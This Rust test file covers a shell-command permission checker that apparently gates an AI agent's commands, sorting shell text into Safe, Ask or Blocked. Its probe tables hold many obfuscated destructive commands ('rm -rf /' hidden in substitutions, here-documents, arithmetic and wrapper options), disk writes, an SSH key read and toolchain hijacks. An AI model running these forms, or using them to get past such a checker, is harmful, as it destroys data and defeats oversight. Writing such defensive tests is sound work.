//! Review probes: shell forms that once hid a command from the checker, and
//! random input that must never panic or exhaust the stack.
use super::*;
use Class::{Ask, Blocked, Safe};

const ROOT: &str = "/work/project";

fn argv(words: &[&str]) -> Verdict {
    classify(&words.iter().map(|w| (*w).to_owned()).collect::<Vec<_>>(), Path::new(ROOT))
}
fn sh(script: &str) -> Verdict {
    argv(&["/bin/sh", "-c", script])
}

/// Shell text through `/bin/sh -c` and the class it must get. The blocked
/// rows each hide `rm -rf /` (or a disk write) in a form the shell runs.
const PROBES: &[(&str, Class)] = &[
    // ANSI-C quotes and a literal dollar sign.
    ("echo $'\\''; rm -rf /; echo $'\\''", Blocked),
    ("echo $'a\\'b'; rm -rf /", Blocked),
    ("echo $'\\c'; rm -rf /; echo '", Blocked),
    ("printf '%s' $'it\\'s'", Ask),
    // Comments inside a substitution.
    ("echo $(true # ) ; cat <<EOF\nrm -rf /\nEOF\n)", Blocked),
    ("echo $(true # it's fine\n rm -rf /)", Blocked),
    ("echo $(ls # list (all)\n)", Ask),
    // Backquotes keep a backslash before a quote.
    ("echo `echo \\'; rm -rf /; echo \\'`", Blocked),
    // Loop headers.
    ("for x do rm -rf /; done", Blocked),
    ("for x in a b; do rm -rf /; done", Blocked),
    ("for x\ndo rm -rf /\ndone", Blocked),
    ("select x do rm -rf /; done", Blocked),
    ("for f in *.rs; do wc -l \"$f\"; done", Safe),
    // Here-document delimiters with quotes, and line joins.
    ("cat <<'E\"OF'\nhello\nE\"OF\nrm -rf /\nEOF", Blocked),
    ("cat <<\"E'OF\"\nhello\nE'OF\nrm -rf /\nEOF", Blocked),
    ("cat <<E\\OF\nhello\nEOF\nrm -rf /", Blocked),
    ("cat <<EOF\na\nEO\\\nF\nrm -rf /\n", Blocked),
    ("cat <<'EOF'\n$(rm -rf /)\nEOF", Ask),
    // Substitutions inside arithmetic, parameter expansion and here-documents.
    ("echo ${x:-$(rm -rf /)}", Blocked),
    ("echo \"${x:-`rm -rf /`}\"", Blocked),
    ("echo ${x:-${y:-$(rm -rf /)}}", Blocked),
    ("echo $(( $(rm -rf /) ))", Blocked),
    ("echo $(( 1 + `rm -rf /` ))", Blocked),
    ("echo $( (rm -rf /) )", Blocked),
    ("cat <<EOF\n$(rm -rf /)\nEOF", Blocked),
    ("cat <<-EOF\n\t`rm -rf /`\n\tEOF", Blocked),
    ("echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(rm -rf /))))))))", Blocked),
    ("echo $((1 << 2)) ${#x} ${x:-default}", Safe),
    ("cat <<EOF\nvalue: $(git rev-parse HEAD)\nEOF", Ask),
    ("echo $(case x in a) rm -rf / ;; esac)", Blocked),
    // Any `case` inside `$(...)` is blocked: shells disagree on its end.
    ("echo $(case x in a) echo ok ;; esac)", Blocked),
    ("git log -1 --format=%s \"$(cat <<'EOF'\nnote (with parens)\nEOF\n)\"", Ask),
    // Wrapper options and destructive targets.
    ("command rm -rf / -v", Blocked),
    ("command -v git", Safe),
    ("command -p rm -rf /", Blocked),
    ("env -v rm -rf /", Blocked),
    ("env --unset=FOO rm -rf /", Blocked),
    ("env -u FOO -i X=1 rm -rf /", Blocked),
    ("env -S 'rm -rf /'", Blocked),
    ("env --some-new-option rm -rf /", Blocked),
    ("bash -O extglob -c 'rm -rf /'", Blocked),
    ("bash --rcfile /tmp/rc -c 'rm -rf /'", Blocked),
    ("bash -eo pipefail -c 'git status'", Safe),
    ("bash -euxo pipefail -c 'rm -rf /'", Blocked),
    ("fish --command='rm -rf /'", Blocked),
    ("chmod -R -x /", Blocked),
    ("chmod -x -R /", Blocked),
    ("chown -R nobody /usr", Blocked),
    ("find -H / -delete", Blocked),
    ("find -L -x / -name x -delete", Blocked),
    ("find -f / -delete", Blocked),
    ("nice -n 5 rm -rf /", Blocked),
    ("nice -n 5 cargo build", Safe),
    ("timeout -s KILL 5 rm -rf /", Blocked),
    ("xargs -I {} rm -rf /", Blocked),
    ("sudo -u nobody rm -rf /", Blocked),
    ("exec -a name rm -rf /", Blocked),
    ("$CMD rm -rf /", Blocked),
    ("eval 'rm -rf /'", Blocked),
    ("trap 'rm -rf /' EXIT", Blocked),
    ("alias ls='rm -rf /'", Blocked),
    ("coproc rm -rf /", Blocked),
    // Read-only programs that can write or run programs.
    ("fd -x rm -rf / {}", Blocked),
    ("fd -X rm {}", Ask),
    ("fd --exec-batch=rm", Ask),
    ("fd -e rs main src", Safe),
    ("awk -v x=1 'BEGIN {system(\"rm -rf /\")}'", Ask),
    ("awk -F, -v OFS=: '{print $1}' data.csv", Safe),
    ("awk -f prog.awk data", Ask),
    ("sed -e'w out'", Ask),
    ("sed --expression='w out' f", Ask),
    ("sed --expression 'w out' f", Ask),
    ("sed -ne 's/a/b/w out' f", Ask),
    ("sed -n -e 's/a/b/p' f", Safe),
    ("sed -nes/a/b/p f", Safe),
    ("sort --compress-program=sh big.txt", Ask),
    ("tar -tf x.tar --to-command=sh", Ask),
    ("tar -tvf x.tar", Safe),
    ("man -P 'rm -rf /' ls", Ask),
    ("less +'!rm x' notes.txt", Ask),
    ("bat --pager=sh notes.txt", Ask),
    ("printf -v PATH %s /tmp", Ask),
    ("file -C -m magic", Ask),
    // Equivalent spellings of protected paths.
    ("rm -rf /./usr", Blocked),
    ("rm -rf /usr/../usr", Blocked),
    ("rm -rf //", Blocked),
    ("echo x > /dev//sda", Blocked),
    ("echo x > /dev/../dev/disk0", Blocked),
    // The allow-list file itself.
    ("echo '{}' | tee .vade/permissions.json", Ask),
    ("[[ -n x ]] && ls", Safe),
    ("[[ x ; rm -rf /", Blocked),
    // Second review (ceae0a0): line joins, arithmetic comments, interpreters,
    // arch, `-C`, here-strings, git and cargo options, build variables.
    ("echo a \\\n# '\nrm -rf /\n# '", Blocked),
    ("echo $(true \\\n# ) '\nrm -rf /\n) # '", Blocked),
    ("sed \\\n  'w out' file", Ask),
    ("awk \\\n  '{system(\"rm -rf /\")}' data", Ask),
    ("bash \\\n  -c \"rm -rf /\"", Blocked),
    ("\\\n  rm -rf /", Blocked),
    ("cat <<EOF\\\n\nhello\nEOF\nrm -rf /", Blocked),
    ("ec\\\nho ok", Ask),
    ("echo $((true # )) '\nrm -rf /\n) ) # '", Blocked),
    ("echo $(( 1 << 2 )) $(( 2#101 )) $(( $# ))", Safe),
    ("echo 'import os' | python3 -v", Ask),
    ("python3 -v <<EOF\nimport os\nEOF", Ask),
    ("ruby -v", Ask),
    ("python3 --version", Safe),
    ("node -v", Safe),
    ("arch -arm64 rm -rf /", Blocked),
    ("arch -arch arm64 git push --force", Ask),
    ("arch", Safe),
    ("bash -C -c 'rm -rf /' true", Blocked),
    ("fish -C 'rm -rf /' -c 'ls'", Blocked),
    ("bash <<< 'rm -rf /'", Blocked),
    ("bash <<< \"$x\"", Ask),
    ("grep x <<< 'some text'", Ask),
    ("git --config-env=core.fsmonitor=V status", Ask),
    ("git --exec-path=/tmp status", Ask),
    ("git --exec-path", Safe),
    ("git branch -Dtopic", Ask),
    ("git branch -vv", Safe),
    ("git tag -dv1", Ask),
    ("git grep -Ovi x", Ask),
    ("git grep --open-files-in-pager=vi x", Ask),
    ("cargo check --config 'build.rustc-wrapper=\"sh\"'", Ask),
    ("LESSOPEN='|sh %s' less f", Ask),
    ("CARGO_TARGET_AARCH64_APPLE_DARWIN_RUNNER=sh cargo run", Ask),
    ("RUSTFLAGS='-C linker=sh' cargo build", Ask),
    ("RUSTFLAGS='-D warnings -C opt-level=3 --cfg tokio_unstable' cargo build", Safe),
    ("env RUSTFLAGS='-Clinker=sh' cargo build", Ask),
    ("CARGO_TARGET_DIR=target2 cargo build", Safe),
    ("x='a[$(rm -rf /)]'; echo $((x))", Blocked),
    ("export X='$(git status)'", Ask),
    ("x=$(git rev-parse HEAD); echo $x", Safe),
];

#[test]
fn review_probes_classify_as_the_shell_runs_them() {
    let mut wrong = Vec::new();
    for (script, expected) in PROBES {
        let verdict = sh(script);
        if verdict.class != *expected {
            wrong.push(format!("{script:?}: got {:?}, want {expected:?}; {}", verdict.class, verdict.reasons()));
        }
    }
    assert!(wrong.is_empty(), "{} wrong:\n{}", wrong.len(), wrong.join("\n"));
}

#[test]
fn direct_argv_probes() {
    for (words, expected) in [
        (&["env", "-v", "rm", "-rf", "/"][..], Blocked),
        (&["command", "rm", "-rf", "/", "-v"], Blocked),
        (&["bash", "-O", "extglob", "-c", "rm -rf /"], Blocked),
        (&["chmod", "-x", "-R", "/"], Blocked),
        (&["find", "-H", "/", "-delete"], Blocked),
        (&["fd", "-x", "rm", "-rf", "/", "{}"], Blocked),
        (&["awk", "-v", "x=1", "BEGIN {system(\"rm -rf /\")}"], Ask),
        (&["sed", "-ew out"], Ask),
        (&["sed", "--expression=w out"], Ask),
        (&["bash", "-c", "for x do rm -rf /; done", "_", "1"], Blocked),
        (&["/bin/sh", "-c", "echo $(true # ) ; cat <<EOF\nrm -rf /\nEOF\n)"], Blocked),
    ] {
        assert_eq!(argv(words).class, expected, "{words:?}");
    }
}

#[test]
fn findings_from_variables_and_allow_list_files_cannot_be_listed() {
    // `"$1$"`: the trailing dollar sign must not clear the variable mark.
    let verdict = sh("bash -c \"$1$\"");
    assert_eq!(verdict.class, Ask);
    assert_eq!(verdict.suggested_rules(), None);
    assert_eq!(sh("echo '{}' | tee .vade/permissions.json").suggested_rules(), None);
    // A literal `*` must not become a rule that matches any file.
    assert_eq!(argv(&["rm", "-rf", "*"]).suggested_rules(), None);
    assert_eq!(argv(&["git", "*", "x"]).suggested_rules(), Some(vec![vec!["git".to_owned(), "*".to_owned(), "x".to_owned()]]));
    // Unknown variables are outside until known.
    assert!(sh("touch $TMPDIR/out").reasons().contains("outside the workspace"));
}

/// Run `body` on a thread with the CLI worker's default stack (2 MiB).
fn on_small_stack(body: impl FnOnce() + Send + 'static) {
    std::thread::Builder::new().stack_size(2 * 1024 * 1024).spawn(body).unwrap().join().unwrap();
}

#[test]
fn long_wrapper_chains_are_refused_without_exhausting_the_stack() {
    on_small_stack(|| {
        // 16 KiB of argv, the tool's limit.
        assert_eq!(sh(&format!("{}true", "env ".repeat(4094))).class, Blocked);
        assert_eq!(sh(&format!("{}true", "nice ".repeat(3200))).class, Blocked);
        assert_eq!(sh(&format!("{}rm -rf /", "$x ".repeat(5000))).class, Blocked);
        assert_eq!(sh(&format!("{}true{}", "${x:-".repeat(3000), "}".repeat(3000))).class, Blocked);
        assert_eq!(sh(&format!("{}1{}", "$((".repeat(3000), "))".repeat(3000))).class, Blocked);
        assert_eq!(sh(&"ls;".repeat(4100)).class, Blocked);
        assert_eq!(sh(&format!("env {}true", "env ".repeat(10))).class, Safe);
    });
}

/// xorshift64: a fixed sequence, so a failure always reproduces.
struct Random(u64);
impl Random {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn below(&mut self, n: usize) -> usize {
        (self.next() % n as u64) as usize
    }
}

#[test]
fn random_input_never_panics_or_exhausts_the_stack() {
    const PIECES: &[&str] = &[
        "$(", ")", "`", "'", "\"", "$'", "\\", "${", "}", "$((", "))", "<<", "<<-", "EOF", "\n", "#", "(", "|", "&&",
        ";", " ", "for x do ", "case x in ", "esac", "rm -rf /", "env ", "sh -c ", "<(", ">", "[[ ", " ]]", "f(){ ", "$x", "*",
    ];
    on_small_stack(|| {
        let mut random = Random(0x9e37_79b9_7f4a_7c15);
        for round in 0..3000 {
            let mut text = String::new();
            let mut bytes = Vec::new();
            for _ in 0..random.below(64) {
                if round % 2 == 0 {
                    text.push_str(PIECES[random.below(PIECES.len())]);
                } else {
                    bytes.push(random.next() as u8);
                }
            }
            text.push_str(&String::from_utf8_lossy(&bytes));
            let verdict = sh(&text);
            let _ = (verdict.reasons(), verdict.suggested_rules());
            let words: Vec<&str> = text.split(' ').collect();
            let _ = argv(&words);
        }
    });
}

#[test]
fn second_review_argv_and_rule_probes() {
    assert_eq!(argv(&["/bin/sh", "-Cc", "rm -rf /", "true"]).class, Blocked);
    assert_eq!(argv(&["arch", "-arm64", "rm", "-rf", "/"]).class, Blocked);
    // Rules must load again with the same words: no empty word, no leading
    // `*`, no substitution text that could stand for another command.
    assert_eq!(sh("sed -i '' 's/a/b/' file.rs").suggested_rules(), None);
    assert_eq!(argv(&["*", "a"]).suggested_rules(), None);
    assert_eq!(sh("cp $(cat list) /tmp/x").suggested_rules(), None);
    assert_eq!(sh("rm -rf build").suggested_rules(), Some(vec![vec!["rm".to_owned(), "-rf".to_owned(), "build".to_owned()]]));
}

/// Third review (of 3b99386). Blocked rows hide `rm -rf /`
/// in a form that `bash`, `sh` or `zsh` runs; Ask rows run text the
/// checker cannot see, or arithmetic on such text.
const THIRD_REVIEW: &[(&str, Class)] = &[
    ("echo \"$\\\n(rm -rf /)\"", Blocked),
    ("echo ${x:-$\\\n(rm -rf /)}", Blocked),
    ("echo $(( $\\\n(rm -rf /) ))", Blocked),
    ("cat <<EOF\n$\\\n(rm -rf /)\nEOF", Blocked),
    ("echo \"$(echo case) echo \"; rm -rf /; echo \" esac)\"", Blocked),
    ("echo \"${x:-'}\"; rm -rf /; echo \"${x:-'}\"", Blocked),
    ("echo \"${x:-'}\"; rm -rf /; echo \"'}\"", Blocked),
    ("echo $((echo ')' ; rm -rf / ; echo ')'))", Blocked),
    ("echo $((echo a) && rm -rf / && (echo b))", Blocked),
    ("echo $((echo a) ; rm -rf / ; (echo b))", Blocked),
    ("env -- RUSTFLAGS='-C linker=sh' cargo build", Ask),
    ("env x='a[$(rm -rf /)]' true", Blocked),
    ("arch -arm64 -e RUSTFLAGS='-C linker=sh' cargo build", Ask),
    ("xargs --replace rm -rf /", Blocked),
    ("bash <<< 'rm -rf /' < /dev/null", Blocked),
    ("bash <<< 'rm -rf /' <<< 'true'", Blocked),
    ("bash <<'EOF' <<< 'true'\nrm -rf /\nEOF", Blocked),
    ("bash <<< 'true' <<'EOF'\nrm -rf /\nEOF", Blocked),
    ("cat << \\\n  EOF\n'\nEOF\nrm -rf /\n# '", Blocked),
    // Arithmetic reads a variable's value as an expression, and an array
    // index in it runs `$(...)`.
    ("x='a[$'; y='(rm -rf /)]'; z=$x$y; echo $((z))", Ask),
    ("z=$(printf 'a[\\x24(rm -rf /)]'); echo $((z))", Ask),
    ("z=$(printf 'a[\\x24(rm -rf /)]'); [[ z -eq 1 ]]", Ask),
    ("z=$(printf 'a[\\x24(rm -rf /)]'); echo \"${a[z]}\"", Ask),
    ("z=$(printf 'a[\\x24(rm -rf /)]'); echo \"${x:z}\"", Ask),
    ("echo $(( $(cat f) ))", Ask),
    ("(( z ))", Ask),
    ("declare -i n; n=z", Ask),
    ("let z", Ask),
    ("i=1; read i; echo $((i))", Ask),
    ("z='a[$(rm -rf /)]'; echo $(( $z ))", Blocked),
    ("read 'a[$(rm -rf /)]' <<< x", Blocked),
    ("printf -v 'a[$(rm -rf /)]' x", Blocked),
    ("unset 'a[$(rm -rf /)]'", Blocked),
    ("test -v 'a[$(rm -rf /)]'", Blocked),
    ("[[ -v 'a[$(rm -rf /)]' ]]", Blocked),
    ("read 'a[0]' <<< x", Ask),
    ("echo $((1 + 2)) $((16#ff)) $((0x1f))", Safe),
    ("i=0; echo $((i + 1))", Safe),
    ("for i in 1 2 3; do echo $((i * 2)); done", Safe),
    ("i=0; i=$((i + 1)); echo $((i))", Safe),
    ("echo $(( $# + 1 )) ${#x} ${x:-default} ${x%.rs}", Safe),
    ("[[ -n $x && $x == a* ]]", Safe),
    ("time -p rm -rf /", Blocked),
    ("time -p rm -rf ~", Blocked),
    ("coproc X { rm -rf /; }", Blocked),
    ("coproc cat f", Safe),
    ("git grep --open-files=\"rm -rf /;\" -e x", Ask),
    ("git diff --ext x", Ask),
    ("go test -exec 'rm -rf ~' ./...", Ask),
    ("go build -toolexec 'sh -c x' .", Ask),
    ("go run example.com/evil@latest", Ask),
    ("go vet -vettool=/tmp/x ./...", Ask),
    ("go test ./...", Safe),
    ("rm -rf {~,x}", Blocked),
    ("rm -rf ~/..", Blocked),
    ("rm -rf $HOME/..", Blocked),
    ("rm -rf /{usr,etc}", Blocked),
    ("base64 --output=/tmp/x -i in", Ask),
    ("less -o/tmp/x README", Ask),
    // Everyday forms stay safe.
    ("for f in src/*.rs; do wc -l \"$f\"; done", Safe),
    ("n=$(wc -l < f); echo $n", Safe),
    ("read -r line < f; echo \"$line\"", Safe),
    // zsh reads `read -p` as a coprocess, not a prompt: not read, so it asks.
    ("read -p '[y/n] ' answer", Ask),
    ("while read -r f; do echo $f; done < list", Safe),
    ("time -p cargo build && time cargo test 2>&1 | tail -5", Safe),
    ("zsh -c 'git log --oneline -5 && git diff --stat'", Safe),
    ("bash -o pipefail -c 'cargo test 2>&1 | tail -5'", Safe),
    ("git branch --show-current; git log --format=%H -1", Safe),
    ("x=$(git rev-parse HEAD); [[ -n $x && ${#x} -eq 40 ]]", Safe),
];

#[test]
fn third_review_probes() {
    let mut wrong = Vec::new();
    for (script, expected) in THIRD_REVIEW {
        let verdict = sh(script);
        if verdict.class != *expected {
            wrong.push(format!("{script:?}: got {:?}, want {expected:?}; {}", verdict.class, verdict.reasons()));
        }
    }
    assert!(wrong.is_empty(), "{} wrong:\n{}", wrong.len(), wrong.join("\n"));
}

#[test]
fn third_review_argv_and_rule_probes() {
    assert_eq!(argv(&["zsh", "-coerrexit", "rm -rf /", "true"]).class, Blocked);
    assert_eq!(argv(&["zsh", "-onotify", "-c", "rm -rf /", "true"]).class, Blocked);
    assert_eq!(argv(&["fish", "-Crm -rf /", "-c", "ls"]).class, Blocked);
    assert_eq!(argv(&["bash", "-o", "pipefail", "-c", "ls"]).class, Safe);
    // Options that run a program or write a file get no rule, and an
    // earlier prefix rule cannot approve them.
    for script in ["cargo check --config 'build.rustc-wrapper=\"sh\"'", "git status --output=/tmp/out", "git grep -O -e x", "go test -exec x ./..."] {
        assert_eq!(sh(script).suggested_rules(), None, "{script}");
    }
    assert_eq!(sh("(( z ))").suggested_rules(), None);
    // Round 15: a rule is the exact argv of plain words. A script, even one
    // with the same words, gets no rule.
    let words = |text: &str| text.split(' ').map(str::to_owned).collect::<Vec<_>>();
    let push = words("git push origin main");
    let decide = |argv: &[String]| super::super::policy::decide(argv, Path::new(ROOT), false);
    assert_eq!(super::super::policy::rule_for(&push, &decide(&push)), Some(push.clone()));
    let script = ["/bin/sh", "-c", "git push origin main"].map(String::from);
    assert_eq!(super::super::policy::rule_for(&script, &decide(&script)), None);
    // A script of one plain word gets the exact argv as its rule, and only
    // that argv (review of aacf3c9, item 7).
    for script in [["/bin/bash", "-c", "true"], ["/bin/bash", "-c", "./build.sh"]] {
        let script = script.map(String::from);
        assert_eq!(super::super::policy::rule_for(&script, &decide(&script)), Some(script.to_vec()));
    }
    let longer = ["/bin/bash", "-c", "./build.sh x"].map(String::from);
    assert_eq!(super::super::policy::rule_for(&longer, &decide(&longer)), None);
}

/// Fourth review (of 6e909b4): `case` inside `$(...)`, zsh loop forms,
/// fish `--command`, zsh `-O`, `printf -vNAME` and toolchain rules.
#[test]
fn fourth_review_probes() {
    for (script, expected) in [
        ("echo \"$([[ -n a && case == * ]]\n) #\"; rm -rf /; echo \"\nesac)\"", Blocked),
        ("echo \"$(case a in a | esac) rm -rf / ;; esac)\"", Blocked),
        ("echo \"$(echo $((true) && case b in a) true ;; b) rm -rf / ;; esac))\"", Blocked),
        ("set -- 1; for x { rm -rf /; }", Blocked),
        ("for x in 1 { rm -rf /; }", Blocked),
        ("for i (1) rm -rf /", Blocked),
        ("repeat 1 rm -rf /", Blocked),
        ("printf -vPATH %s /tmp", Ask),
        ("printf -v x %s 1; echo $x", Ask),
    ] {
        assert_eq!(sh(script).class, expected, "{script:?}: {}", sh(script).reasons());
    }
    for words in [
        &["fish", "--command=ls", "-c", "rm -rf /"][..],
        &["fish", "--command", "ls", "-c", "rm -rf /"],
        &["fish", "-c", "ls", "--command", "rm -rf /"],
        &["zsh", "-c", "-O", "rm -rf /", "true"],
        &["bash", "-O", "extglob", "-c", "rm -rf /"],
    ] {
        assert_eq!(argv(words).class, Blocked, "{words:?}");
    }
    assert_eq!(argv(&["zsh", "-O", "-c", "ls"]).class, Safe);
    let exact = |text: &str| Some(vec![text.split(' ').map(str::to_owned).collect::<Vec<_>>()]);
    assert_eq!(sh("cargo +1.99.0 fmt").suggested_rules(), exact("cargo +1.99.0 fmt"));
    assert_eq!(sh("cargo fmt").suggested_rules(), exact("cargo fmt *"));
}

/// Fifth review (of a156f46): a `$((` that is a command substitution,
/// quotes in `${...}` and backquotes, loop header values and `+=`.
#[test]
fn fifth_review_probes() {
    for (script, expected) in [
        ("echo \"$((true # )\n) ; rm -rf / ; echo )\"", Blocked),
        ("echo \"$((cat <<EOF\n)\nEOF\n) ; rm -rf / ; echo )\"", Blocked),
        ("echo $((true) ; rm -rf / )", Blocked),
        ("echo ${x:-'$(echo '$(rm -rf /)')'}", Blocked),
        ("echo ${x:-\"'\"$(rm -rf /)\"'\"}", Blocked),
        ("echo ${x:-`echo \\\" ; rm -rf / ; echo \\\"`}", Blocked),
        ("cat <<EOF\n`echo \\\" ; rm -rf / ; echo \\\"`\nEOF", Blocked),
        ("cat <<EOF\n'$(rm -rf /)'\nEOF", Blocked),
        // bash and sh keep `\"` here, zsh removes the backslash.
        ("echo \"${x:-`echo \\\" ; rm -rf / ; echo \\\"`}\"", Blocked),
        ("echo \"`echo \\\" ; rm -rf / ; echo \\\"`\"", Ask),
        ("echo ${x:-'$(rm -rf /)'}", Ask),
        ("for x in 'a[$(rm -rf /)]'; do echo $((x)); done", Blocked),
        ("x='a[$'; y='(rm -rf /)]'; z=$x$y; for i in $((z)); do true; done", Ask),
        ("repeat $((z)) true; z=a", Ask),
        ("declare z+='a[$'; declare z+='(rm -rf /)]'; echo $((z))", Ask),
        ("export RUSTFLAGS+=' -C linker=sh'; cargo build", Ask),
        ("RUSTFLAGS+=' -C linker=sh' cargo build", Ask),
        ("for i in $(( $(cat f) )); do true; done", Ask),
        ("for i in 1 2; do echo $((i)); done", Safe),
    ] {
        assert_eq!(sh(script).class, expected, "{script:?}: {}", sh(script).reasons());
    }
    let ssh = sh("for f in ~/.ssh/id_rsa; do cat \"$f\"; done");
    assert_eq!(ssh.class, Ask, "{}", ssh.reasons());
    assert_eq!(ssh.suggested_rules(), None);
    for words in [&["fish", "--init-command", "rm -rf /", "-c", "ls"][..], &["fish", "--init-command=rm -rf /", "-c", "ls"]] {
        assert_eq!(argv(words).class, Blocked, "{words:?}");
    }
}

/// Review of a156f46 and 91dca2b: arithmetic and expansion forms that run
/// text, `printf %n`, option values, and a command with too many findings.
/// Forms the checker does not read are never safe.
#[test]
fn sixth_review_probes() {
    for (script, expected) in [
        (": \"${x:=$(printf 'a[\\x24(rm -rf /)]')}\"; echo $((x))", Ask),
        ("x=$(printf 'a[\\x24(rm -rf /)]'); echo \"${!x}\"", Ask),
        ("echo $[ $(printf 'a[\\x24(rm -rf /)]') ]", Ask),
        ("x=$(cat f); echo $[x]", Ask),
        ("echo ${!1}", Ask),
        // zsh flags and modifiers that expand or glob a value.
        ("echo ${(e)x}", Ask),
        ("echo ${~x}", Ask),
        ("echo $~x", Ask),
        ("echo ${=x} $=x ${^x} ${+x}", Ask),
        ("echo \"${x@P}\"", Ask),
        ("echo g1(e:'rm -rf /':)", Ask),
        ("printf \"%n\" \"a[\\$(rm -rf /)]\"", Blocked),
        ("printf \"$f\" \"$x\"", Ask),
        ("printf '%s %n\\n' a b; echo $((b))", Ask),
        ("mapfile -C 'rm -rf / #' -c 1 <<< x", Ask),
        ("readarray -C\"$f\" -c 1 <<< x", Ask),
        ("sort -o/tmp/out input", Ask),
        ("go build -ldflags '-linkmode=external -extld=/tmp/linker' .", Ask),
        // Forms the checker reads stay safe.
        ("echo ${x:-a} ${#x} ${x%.rs} ${x/a/b} ${x:2:3} ${a[1]} ${x^^} $ \"$\"", Safe),
        // Forms outside the plain subset ask even when they are harmless.
        ("echo ${!a[@]} ${x@Q} a$/b", Ask),
        ("echo ${x:=1} ${y=2}", Ask),
    ] {
        assert_eq!(sh(script).class, expected, "{script:?}: {}", sh(script).reasons());
    }
    assert_eq!(argv(&["bash", "-c", "echo $((${1}))", "_", "a[$(rm -rf /)]"]).class, Ask);
    assert_eq!(argv(&["zsh", "-fc", "printf \"%n\" \"a[\\$(rm -rf /)]\""]).class, Blocked);
    assert_eq!(sh("go build -ldflags '-extld=/tmp/linker' .").suggested_rules(), None);
    // Past the finding limit no rule approves the command: the dropped
    // findings may be the parts no rule covers.
    let words = |text: &str| text.split(' ').map(str::to_owned).collect::<Vec<_>>();
    let approvals = super::super::permissions::Approvals::new(None, None, false).unwrap();
    approvals.remember(super::super::permissions::Scope::Session, &[words("git push origin b1")]).unwrap();
    let pushes: String = (0..300).map(|n| format!("git push origin b{n}; ")).collect();
    for last in ["touch unapproved.txt", "eval 'touch unapproved.txt'"] {
        let verdict = sh(&format!("{pushes}{last}"));
        assert_eq!(verdict.class, Ask, "{last}");
        let script = ["/bin/sh".to_owned(), "-c".to_owned(), format!("{pushes}{last}")];
        assert_eq!(approvals.allowed(&script, &verdict, Path::new(ROOT)), None, "{last}");
        assert_eq!(verdict.suggested_rules(), None, "{last}");
    }
    let one = words("git push origin b1");
    assert!(approvals.allowed(&one, &super::super::policy::decide(&one, Path::new(ROOT), false), Path::new(ROOT)).is_some());
}
